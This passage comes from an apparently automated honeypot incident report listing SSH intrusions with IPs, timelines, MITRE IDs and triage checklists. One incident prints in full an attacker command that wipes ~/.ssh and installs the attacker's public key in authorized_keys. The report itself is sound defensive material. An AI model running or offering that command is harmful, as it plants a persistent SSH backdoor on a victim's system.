| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:16:59` | `cowrie.session.connect` |
| `2026-09-27 13:17:00` | `cowrie.client.version` |
| `2026-09-27 13:17:00` | `cowrie.client.kex` |
| `2026-09-27 13:17:02` | `cowrie.login.success` |
| `2026-09-27 13:17:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.224.213[.]222` to AbuseIPDB if not already reported
- [ ] Block `14.224.213[.]222` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0c785b55fc0

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:17 |
| **Last Seen** | 2026-09-27 13:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:17:00` | `cowrie.session.connect` |
| `2026-09-27 13:17:00` | `cowrie.client.version` |
| `2026-09-27 13:17:00` | `cowrie.client.kex` |
| `2026-09-27 13:17:00` | `cowrie.login.success` |
| `2026-09-27 13:17:01` | `cowrie.session.params` |
| `2026-09-27 13:17:01` | `cowrie.command.input` |
| `2026-09-27 13:17:01` | `cowrie.log.closed` |
| `2026-09-27 13:17:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77110d90c715

| Field | Detail |
|---|---|
| **Source IP** | `14.224.213[.]222` |
| **First Seen** | 2026-09-27 13:17 |
| **Last Seen** | 2026-09-27 13:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:17:04` | `cowrie.session.connect` |
| `2026-09-27 13:17:04` | `cowrie.client.version` |
| `2026-09-27 13:17:04` | `cowrie.client.kex` |
| `2026-09-27 13:17:06` | `cowrie.login.success` |
| `2026-09-27 13:17:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.224.213[.]222` to AbuseIPDB if not already reported
- [ ] Block `14.224.213[.]222` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-695733c3f8f1

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:17 |
| **Last Seen** | 2026-09-27 13:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:17:05` | `cowrie.session.connect` |
| `2026-09-27 13:17:05` | `cowrie.client.version` |
| `2026-09-27 13:17:05` | `cowrie.client.kex` |
| `2026-09-27 13:17:06` | `cowrie.login.success` |
| `2026-09-27 13:17:07` | `cowrie.session.params` |
| `2026-09-27 13:17:07` | `cowrie.command.input` |
| `2026-09-27 13:17:07` | `cowrie.log.closed` |
| `2026-09-27 13:17:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c858eb88abda

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:17 |
| **Last Seen** | 2026-09-27 13:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:17:10` | `cowrie.session.connect` |
| `2026-09-27 13:17:10` | `cowrie.client.version` |
| `2026-09-27 13:17:10` | `cowrie.client.kex` |
| `2026-09-27 13:17:11` | `cowrie.login.success` |
| `2026-09-27 13:17:12` | `cowrie.session.params` |
| `2026-09-27 13:17:12` | `cowrie.command.input` |
| `2026-09-27 13:17:12` | `cowrie.log.closed` |
| `2026-09-27 13:17:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf207e753c51

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:17 |
| **Last Seen** | 2026-09-27 13:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:17:15` | `cowrie.session.connect` |
| `2026-09-27 13:17:15` | `cowrie.client.version` |
| `2026-09-27 13:17:15` | `cowrie.client.kex` |
| `2026-09-27 13:17:16` | `cowrie.login.success` |
| `2026-09-27 13:17:17` | `cowrie.session.params` |
| `2026-09-27 13:17:17` | `cowrie.command.input` |
| `2026-09-27 13:17:17` | `cowrie.log.closed` |
| `2026-09-27 13:17:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf7014768585

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:17 |
| **Last Seen** | 2026-09-27 13:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:17:20` | `cowrie.session.connect` |
| `2026-09-27 13:17:20` | `cowrie.client.version` |
| `2026-09-27 13:17:20` | `cowrie.client.kex` |
| `2026-09-27 13:17:20` | `cowrie.login.success` |
| `2026-09-27 13:17:21` | `cowrie.session.params` |
| `2026-09-27 13:17:21` | `cowrie.command.input` |
| `2026-09-27 13:17:21` | `cowrie.log.closed` |
| `2026-09-27 13:17:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-733f1b52d8e8

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:17 |
| **Last Seen** | 2026-09-27 13:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:17:25` | `cowrie.session.connect` |
| `2026-09-27 13:17:25` | `cowrie.client.version` |
| `2026-09-27 13:17:25` | `cowrie.client.kex` |
| `2026-09-27 13:17:25` | `cowrie.login.success` |
| `2026-09-27 13:17:26` | `cowrie.session.params` |
| `2026-09-27 13:17:26` | `cowrie.command.input` |
| `2026-09-27 13:17:26` | `cowrie.log.closed` |
| `2026-09-27 13:17:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1f133a3286f

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:17 |
| **Last Seen** | 2026-09-27 13:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:17:30` | `cowrie.session.connect` |
| `2026-09-27 13:17:30` | `cowrie.client.version` |
| `2026-09-27 13:17:30` | `cowrie.client.kex` |
| `2026-09-27 13:17:30` | `cowrie.login.success` |
| `2026-09-27 13:17:31` | `cowrie.session.params` |
| `2026-09-27 13:17:31` | `cowrie.command.input` |
| `2026-09-27 13:17:31` | `cowrie.log.closed` |
| `2026-09-27 13:17:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1271a5d7eb42

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:17 |
| **Last Seen** | 2026-09-27 13:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:17:35` | `cowrie.session.connect` |
| `2026-09-27 13:17:35` | `cowrie.client.version` |
| `2026-09-27 13:17:35` | `cowrie.client.kex` |
| `2026-09-27 13:17:35` | `cowrie.login.success` |
| `2026-09-27 13:17:36` | `cowrie.session.params` |
| `2026-09-27 13:17:36` | `cowrie.command.input` |
| `2026-09-27 13:17:36` | `cowrie.log.closed` |
| `2026-09-27 13:17:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5a81feac74a

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-09-27 13:17 |
| **Last Seen** | 2026-09-27 13:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:17:37` | `cowrie.session.connect` |
| `2026-09-27 13:17:37` | `cowrie.client.version` |
| `2026-09-27 13:17:37` | `cowrie.client.kex` |
| `2026-09-27 13:17:37` | `cowrie.login.success` |
| `2026-09-27 13:17:38` | `cowrie.session.params` |
| `2026-09-27 13:17:38` | `cowrie.command.input` |
| `2026-09-27 13:17:38` | `cowrie.command.failed` |
| `2026-09-27 13:17:38` | `cowrie.log.closed` |
| `2026-09-27 13:17:39` | `cowrie.session.params` |
| `2026-09-27 13:17:39` | `cowrie.command.input` |
| `2026-09-27 13:17:39` | `cowrie.session.file_download` |
| `2026-09-27 13:17:39` | `cowrie.log.closed` |
| `2026-09-27 13:17:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad18022a7b10

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-09-27 13:17 |
| **Last Seen** | 2026-09-27 13:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:17:39` | `cowrie.session.connect` |
| `2026-09-27 13:17:39` | `cowrie.client.version` |
| `2026-09-27 13:17:39` | `cowrie.client.kex` |
| `2026-09-27 13:17:39` | `cowrie.login.success` |
| `2026-09-27 13:17:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79acc7e34479

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-09-27 13:17 |
| **Last Seen** | 2026-09-27 13:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:17:39` | `cowrie.session.connect` |
| `2026-09-27 13:17:39` | `cowrie.client.version` |
| `2026-09-27 13:17:39` | `cowrie.client.kex` |
| `2026-09-27 13:17:39` | `cowrie.login.success` |
| `2026-09-27 13:17:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0be765012b48

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:17 |
| **Last Seen** | 2026-09-27 13:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:17:40` | `cowrie.session.connect` |
| `2026-09-27 13:17:40` | `cowrie.client.version` |
| `2026-09-27 13:17:40` | `cowrie.client.kex` |
| `2026-09-27 13:17:40` | `cowrie.login.success` |
| `2026-09-27 13:17:41` | `cowrie.session.params` |
| `2026-09-27 13:17:41` | `cowrie.command.input` |
| `2026-09-27 13:17:41` | `cowrie.log.closed` |
| `2026-09-27 13:17:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0a4a09dba11

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-27 13:17 |
| **Last Seen** | 2026-09-27 13:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:17:43` | `cowrie.session.connect` |
| `2026-09-27 13:17:43` | `cowrie.client.version` |
| `2026-09-27 13:17:43` | `cowrie.client.kex` |
| `2026-09-27 13:17:43` | `cowrie.login.success` |
| `2026-09-27 13:17:43` | `cowrie.direct-tcpip.request` |
| `2026-09-27 13:17:44` | `cowrie.direct-tcpip.data` |
| `2026-09-27 13:17:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e54d0c20d2f

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:17 |
| **Last Seen** | 2026-09-27 13:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:17:45` | `cowrie.session.connect` |
| `2026-09-27 13:17:45` | `cowrie.client.version` |
| `2026-09-27 13:17:45` | `cowrie.client.kex` |
| `2026-09-27 13:17:46` | `cowrie.login.success` |
| `2026-09-27 13:17:47` | `cowrie.session.params` |
| `2026-09-27 13:17:47` | `cowrie.command.input` |
| `2026-09-27 13:17:47` | `cowrie.log.closed` |
| `2026-09-27 13:17:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-542bd8f6db88

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:17 |
| **Last Seen** | 2026-09-27 13:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:17:50` | `cowrie.session.connect` |
| `2026-09-27 13:17:50` | `cowrie.client.version` |
| `2026-09-27 13:17:51` | `cowrie.client.kex` |
| `2026-09-27 13:17:52` | `cowrie.login.success` |
| `2026-09-27 13:17:53` | `cowrie.session.params` |
| `2026-09-27 13:17:53` | `cowrie.command.input` |
| `2026-09-27 13:17:53` | `cowrie.log.closed` |
| `2026-09-27 13:17:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9611ea586fc9

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:17 |
| **Last Seen** | 2026-09-27 13:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:17:56` | `cowrie.session.connect` |
| `2026-09-27 13:17:56` | `cowrie.client.version` |
| `2026-09-27 13:17:56` | `cowrie.client.kex` |
| `2026-09-27 13:17:56` | `cowrie.login.success` |
| `2026-09-27 13:17:57` | `cowrie.session.params` |
| `2026-09-27 13:17:57` | `cowrie.command.input` |
| `2026-09-27 13:17:57` | `cowrie.log.closed` |
| `2026-09-27 13:17:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03fa7a44e78f

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:18 |
| **Last Seen** | 2026-09-27 13:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:18:01` | `cowrie.session.connect` |
| `2026-09-27 13:18:01` | `cowrie.client.version` |
| `2026-09-27 13:18:01` | `cowrie.client.kex` |
| `2026-09-27 13:18:01` | `cowrie.login.success` |
| `2026-09-27 13:18:02` | `cowrie.session.params` |
| `2026-09-27 13:18:02` | `cowrie.command.input` |
| `2026-09-27 13:18:02` | `cowrie.log.closed` |
| `2026-09-27 13:18:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25196fec8ab4

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:18 |
| **Last Seen** | 2026-09-27 13:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:18:06` | `cowrie.session.connect` |
| `2026-09-27 13:18:06` | `cowrie.client.version` |
| `2026-09-27 13:18:06` | `cowrie.client.kex` |
| `2026-09-27 13:18:06` | `cowrie.login.success` |
| `2026-09-27 13:18:07` | `cowrie.session.params` |
| `2026-09-27 13:18:07` | `cowrie.command.input` |
| `2026-09-27 13:18:07` | `cowrie.log.closed` |
| `2026-09-27 13:18:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-184db68f1117

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:18 |
| **Last Seen** | 2026-09-27 13:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:18:11` | `cowrie.session.connect` |
| `2026-09-27 13:18:11` | `cowrie.client.version` |
| `2026-09-27 13:18:11` | `cowrie.client.kex` |
| `2026-09-27 13:18:12` | `cowrie.login.success` |
| `2026-09-27 13:18:12` | `cowrie.session.params` |
| `2026-09-27 13:18:12` | `cowrie.command.input` |
| `2026-09-27 13:18:12` | `cowrie.log.closed` |
| `2026-09-27 13:18:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-797432fba2eb

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:18 |
| **Last Seen** | 2026-09-27 13:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:18:15` | `cowrie.session.connect` |
| `2026-09-27 13:18:15` | `cowrie.client.version` |
| `2026-09-27 13:18:16` | `cowrie.client.kex` |
| `2026-09-27 13:18:16` | `cowrie.login.success` |
| `2026-09-27 13:18:17` | `cowrie.session.params` |
| `2026-09-27 13:18:17` | `cowrie.command.input` |
| `2026-09-27 13:18:18` | `cowrie.log.closed` |
| `2026-09-27 13:18:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f01d0699bd6b

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:18 |
| **Last Seen** | 2026-09-27 13:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:18:21` | `cowrie.session.connect` |
| `2026-09-27 13:18:21` | `cowrie.client.version` |
| `2026-09-27 13:18:21` | `cowrie.client.kex` |
| `2026-09-27 13:18:21` | `cowrie.login.success` |
| `2026-09-27 13:18:22` | `cowrie.session.params` |
| `2026-09-27 13:18:22` | `cowrie.command.input` |
| `2026-09-27 13:18:23` | `cowrie.log.closed` |
| `2026-09-27 13:18:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a72ceb48f752

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:18 |
| **Last Seen** | 2026-09-27 13:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:18:26` | `cowrie.session.connect` |
| `2026-09-27 13:18:26` | `cowrie.client.version` |
| `2026-09-27 13:18:26` | `cowrie.client.kex` |
| `2026-09-27 13:18:26` | `cowrie.login.success` |
| `2026-09-27 13:18:27` | `cowrie.session.params` |
| `2026-09-27 13:18:27` | `cowrie.command.input` |
| `2026-09-27 13:18:27` | `cowrie.log.closed` |
| `2026-09-27 13:18:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0422c816bc19

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:18 |
| **Last Seen** | 2026-09-27 13:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:18:31` | `cowrie.session.connect` |
| `2026-09-27 13:18:31` | `cowrie.client.version` |
| `2026-09-27 13:18:31` | `cowrie.client.kex` |
| `2026-09-27 13:18:31` | `cowrie.login.success` |
| `2026-09-27 13:18:32` | `cowrie.session.params` |
| `2026-09-27 13:18:32` | `cowrie.command.input` |
| `2026-09-27 13:18:32` | `cowrie.log.closed` |
| `2026-09-27 13:18:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e21e5aa688b

| Field | Detail |
|---|---|
| **Source IP** | `59.179.31[.]237` |
| **First Seen** | 2026-09-27 13:18 |
| **Last Seen** | 2026-09-27 13:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
